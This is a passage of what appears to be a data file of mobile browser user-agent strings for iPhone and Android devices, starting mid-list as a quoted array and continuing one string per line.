AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/102.0.5005.67 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/536.0 (KHTML, like Gecko) CriOS/38.0.865.0 Mobile/60O993 Safari/536.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/242.1.493995244 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/242.1.493995244 Mobile/15E148 Safari/604.1", "ExMessager/6.0.1 (iPhone; iOS 12.5.7; Scale/2.00)", "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/TQ3A.230805.001.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Brave/115.0.5790.171 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.1.38 (KHTML, like Gecko) Brave/1.2.9 Mobile/14A5297c Safari/602.1.38", "Mozilla/5.0 (YouTube; Android 14; Pixel 7 Pro Build/UPB5.230623.005; wv) AppleWebKit/605.1.15 (KHTML, like Gecko) Brave/115.0.5790.171 Mobile Safari/604.1 Display/1366x768", "Mozilla/5.0 (YouTube; Android 14; Pixel 7 Pro Build/UPB5.230623.005; wv) AppleWebKit/605.1.15 (KHTML, like Gecko) Brave/115.0.5790.171 Mobile Safari/604.1 Size/1366x768", "Mozilla/5.0 (YouTube; Android 14; Pixel 7 Pro Build/UPB5.230623.005; wv) AppleWebKit/605.1.15 (KHTML, like Gecko) Brave/115.0.5790.171 Mobile Safari/604.1 Resolution/1366x768", "Mozilla/5.0 (YouTube; Android 14; Pixel 7 Pro Build/UPB5.230623.005; wv) AppleWebKit/605.1.15 (KHTML, like Gecko) Brave/115.0.5790.171 Mobile Safari/604.1 1366x768", "Mozilla/5.0 (Android 14; Pixel 7 Pro Build/UPB5.230623.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Brave/115.0.5790.171 Mobile Safari/537.36", "Mozilla/5.0 (Android 14; Pixel 7 Pro Build/UPB5.230623.005; wv) Gecko/113.0 Firefox/113.0 Brave/115.0.5790.171 KaiOS", "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-R860) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0. Chrome/111.0.5563.116 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 13; SM-A226B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 SznProhlizec/10.2.1a", "Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]", "Mozilla/5.0 (Linux; Android 12; SM-S124DL Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]", "Mozilla/5.0 (Linux; Android 13; SM-A135F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]", "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.25.113;]", "Mozilla/5.0 (Linux; Android 11; SM-E426S Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]", "Mozilla/5.0 (Linux; Android 6.0.1; SM-A9000 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]", "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F/G973FXXSGHWC2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36, Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; BLA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; MI 6 Build/OPR1.170623.027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; SM-J600F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; G3121) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; GM 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J701F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-A710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.94 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/78.0.257670029 Mobile/16F203 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; XT1650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.3; GT-I9300) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G530F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36
Mozilla/5.0 (Android 8.0.0; SM-C7000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3317.0 YaaniBrowser/4.3.0.153 (Turkcell-TR) Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-X240) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-J710FQ Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; RNE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; F3211) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0; LG-K350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.0.2; HTC_M9e) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; GM 5 d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; G3221) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; Lenovo K53a48) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; HTC One_M8 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.2454.95 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J320H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-A605F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-A500H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.3; GT-I9300) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-A700F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J701F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; HTC Desire 820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H815) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; HUAWEI KII-L21 Build/HUAWEIKII-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G800H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A320F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A500F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; GT-I9301Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.4.2; tr-tr; LG-D802TR Build/KOT49I.D802TR20c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; Mi 9 SE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.1.0; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J500F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-C9000 Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-C9000 Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; U; Android 4.4.2; tr-tr; LG-D723 Build/KOT49I.A1408546115) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J320H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A730F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G800H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1
Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; GT-I9060 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N960F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/78.0.257670029 Mobile/16F203 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; SM-G531F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; POT-LX1 Build/HUAWEIPOT-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; GT-I9301Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; ASUS_Z002 Build/LRX21V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; SM-T113) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1
Mozilla/5.0 (Linux; Android 5.0; ASUS_Z002 Build/LRX21V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; ATU-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; RNE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.4.4; tr-tr; GT-I9060I Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
Mozilla/5.0 (Linux; Android 8.1.0; DRA-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; GM 5 Plus Build/NNJ34) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; D6603) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-G531F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
